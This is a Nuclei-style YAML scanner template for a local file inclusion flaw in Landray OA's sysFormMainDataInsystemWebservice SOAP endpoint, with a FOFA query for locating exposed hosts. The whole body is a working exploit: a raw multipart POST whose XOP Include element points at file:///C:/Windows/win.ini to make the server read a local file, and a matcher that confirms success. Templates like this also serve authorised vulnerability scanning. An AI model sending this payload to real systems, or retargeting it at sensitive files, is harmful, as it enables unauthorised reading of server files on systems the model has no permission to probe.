id: lanling-oa-sysFormMainDataInsystemWebservice-fileread

info:
  name: lanling-oa-sysFormMainDataInsystemWebservice-fileread
  author: PokerSec
  severity: high
  metadata:
    fofasearch:  body="Com_Parameter"
  tags: landray,lfi,landray-eis

variables:
  boundary: "{{to_lower(rand_base(20))}}"

http:
  - raw:
      - |
        POST /sys/webservice/sysFormMainDataInsystemWebservice HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/related; boundary=----{{boundary}}
        SOAPAction: ""
        Accept-Encoding: gzip, deflate

        ------{{boundary}}
        Content-Disposition: form-data; name="a"

        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.maindata.xform.sys.kmss.landray.com/">
        <soapenv:Header/>
        <soapenv:Body>
            <web:getData>
                <arg0>
                    <beginTimeStamp>a</beginTimeStamp>
                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
                </arg0>
            </web:getData>
        </soapenv:Body>
        </soapenv:Envelope>
        ------{{boundary}}--

    matchers:
      - type: dsl
        dsl:
          - status_code==500 && contains_all(body,"<soap:Envelope") && contains_all(body,"<faultstring>") && contains_all(body,"Unmarshalling Error")